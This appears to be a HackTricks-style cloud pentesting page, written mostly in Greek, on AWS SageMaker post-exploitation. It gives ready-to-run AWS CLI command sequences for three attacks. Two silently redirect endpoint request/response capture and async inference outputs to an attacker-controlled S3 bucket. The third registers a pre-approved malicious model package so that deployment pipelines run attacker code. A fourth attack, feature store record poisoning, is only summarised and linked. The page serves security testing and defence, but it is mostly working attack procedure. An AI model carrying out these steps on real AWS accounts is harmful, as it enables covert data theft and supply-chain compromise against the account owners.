# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker endpoint data siphon μέσω UpdateEndpoint DataCaptureConfig

Κατάχρηση της διαχείρισης SageMaker endpoint για να ενεργοποιηθεί πλήρης καταγραφή αιτημάτων/απαντήσεων σε S3 bucket που ελέγχεται από τον επιτιθέμενο χωρίς να πειραχτεί το model ή το container. Χρησιμοποιεί ένα zero/low‑downtime rolling update και απαιτεί μόνο δικαιώματα διαχείρισης endpoint.

### Απαιτήσεις
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (ή χρησιμοποιήστε υπάρχον bucket στον ίδιο λογαριασμό)
- Προαιρετικό (αν χρησιμοποιείτε SSE‑KMS): `kms:Encrypt` στο επιλεγμένο CMK
- Στόχος: Ένα υπάρχον InService real‑time endpoint στον ίδιο λογαριασμό/περιοχή

### Βήματα
1) Εντοπίστε ένα InService endpoint και συλλέξτε τα τρέχοντα production variants
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) Προετοιμάστε τον προορισμό S3 του attacker για captures
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) Δημιουργήστε ένα νέο EndpointConfig που διατηρεί τα ίδια variants αλλά ενεργοποιεί το DataCapture στο attacker bucket

Σημείωση: Χρησιμοποιήστε ρητούς τύπους περιεχομένου που ικανοποιούν την επικύρωση του CLI.
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) Εφαρμόστε τη νέα διαμόρφωση με rolling update (ελάχιστη/καθόλου διακοπή λειτουργίας)
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) Δημιούργησε τουλάχιστον μία κλήση inference (προαιρετικό εάν υπάρχει ζωντανή κίνηση)
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) Επαληθεύστε τις καταγραφές στο S3 του attacker
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### Επιπτώσεις
- Πλήρης exfiltration των real‑time inference request και response payloads (και metadata) από το στοχευμένο endpoint σε έναν S3 bucket ελεγχόμενο από τον επιτιθέμενο.
- Χωρίς αλλαγές στην εικόνα model/container και μόνο αλλαγές σε επίπεδο endpoint, επιτρέποντας μια διακριτική διαδρομή κλοπής δεδομένων με ελάχιστη λειτουργική διαταραχή.


## SageMaker async inference output hijack via UpdateEndpoint AsyncInferenceConfig

Κακοποίηση της διαχείρισης endpoint για την ανακατεύθυνση των asynchronous inference outputs σε έναν S3 bucket ελεγχόμενο από τον επιτιθέμενο, κλωνοποιώντας την τρέχουσα EndpointConfig και ρυθμίζοντας το AsyncInferenceConfig.OutputConfig S3OutputPath/S3FailurePath. Αυτό exfiltrates τις προβλέψεις του model (και οποιεσδήποτε μετασχηματισμένες εισόδους που περιλαμβάνονται από το container) χωρίς να τροποποιείται το model/container.

### Απαιτήσεις
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: Δυνατότητα εγγραφής στον attacker S3 bucket (μέσω του model execution role ή μιας permissive bucket policy)
- Στόχος: Ένα InService endpoint όπου asynchronous invocations χρησιμοποιούνται (ή θα χρησιμοποιηθούν)

### Βήματα
1) Συλλέξτε τα τρέχοντα ProductionVariants από το στοχευόμενο endpoint
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) Δημιουργήστε έναν attacker bucket (βεβαιωθείτε ότι το model execution role μπορεί να κάνει PutObject σε αυτόν)
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) Κλωνοποίηση του EndpointConfig και hijack των αποτελεσμάτων του AsyncInference στο attacker bucket
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) Προκαλέστε μια async invocation και επαληθεύστε ότι τα αντικείμενα καταλήγουν στο S3 του επιτιθέμενου
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### Επίπτωση
- Ανακατευθύνει τα αποτελέσματα ασύγχρονης inference (και τα σώματα σφαλμάτων) σε S3 που ελέγχεται από τον επιτιθέμενο, επιτρέποντας covert exfiltration των predictions και ενδεχομένως ευαίσθητων προ-/μετα-επεξεργασμένων εισόδων που παράγονται από το container, χωρίς αλλαγή του model code ή του image και με ελάχιστο/καθόλου downtime.


## SageMaker Model Registry supply-chain injection μέσω CreateModelPackage(Approved)

Εάν ένας επιτιθέμενος μπορεί να εκτελέσει CreateModelPackage σε ένα στοχευμένο SageMaker Model Package Group, μπορεί να καταχωρήσει μια νέα έκδοση μοντέλου που δείχνει σε attacker-controlled container image και να τη σημάνει αμέσως ως Approved. Πολλά CI/CD pipelines αναπτύσσουν αυτόματα Approved model versions σε endpoints ή training jobs, με αποτέλεσμα εκτέλεση κώδικα του επιτιθέμενου υπό τα execution roles της υπηρεσίας. Η έκθεση μεταξύ λογαριασμών μπορεί να ενισχυθεί από μια permissive ModelPackageGroup resource policy.

### Requirements
- IAM (ελάχιστα δικαιώματα για να μολυνθεί μια υπάρχουσα group): `sagemaker:CreateModelPackage` on the target ModelPackageGroup
- Optional (για να δημιουργηθεί μια group εάν δεν υπάρχει): `sagemaker:CreateModelPackageGroup`
- S3: Read access to referenced ModelDataUrl (or host attacker-controlled artifacts)
- Target: A Model Package Group that downstream automation watches for Approved versions

### Steps
1) Set region and create/find a target Model Package Group
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) Προετοιμάστε ψεύτικα δεδομένα μοντέλου στο S3
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) Εγγραφή ενός malicious (here benign) Approved model package version που αναφέρεται σε δημόσια AWS DLC image
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) Επιβεβαιώστε ότι η νέα εγκεκριμένη έκδοση υπάρχει
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### Επιπτώσεις
- Poison the Model Registry με μια Approved έκδοση που αναφέρεται σε κώδικα ελεγχόμενο από τον επιτιθέμενο. Οι Pipelines που αυτοματοποιούν την ανάπτυξη Approved models μπορεί να τραβήξουν και να εκτελέσουν το attacker image, οδηγώντας σε εκτέλεση κώδικα με δικαιώματα endpoint/training roles.
- Με μια επιεική πολιτική πόρου ModelPackageGroup (PutModelPackageGroupPolicy), αυτή η κατάχρηση μπορεί να ενεργοποιηθεί cross-account.

## Feature store poisoning

Κακοποιήστε το `sagemaker:PutRecord` σε ένα Feature Group με ενεργοποιημένο το OnlineStore για να αντικαταστήσετε ζωντανές τιμές features που καταναλώνονται από online inference. Σε συνδυασμό με το `sagemaker:GetRecord`, ο επιτιθέμενος μπορεί να διαβάσει ευαίσθητα features. Αυτό δεν απαιτεί πρόσβαση σε models ή endpoints.

{{#ref}}
feature-store-poisoning.md
{{/ref}}
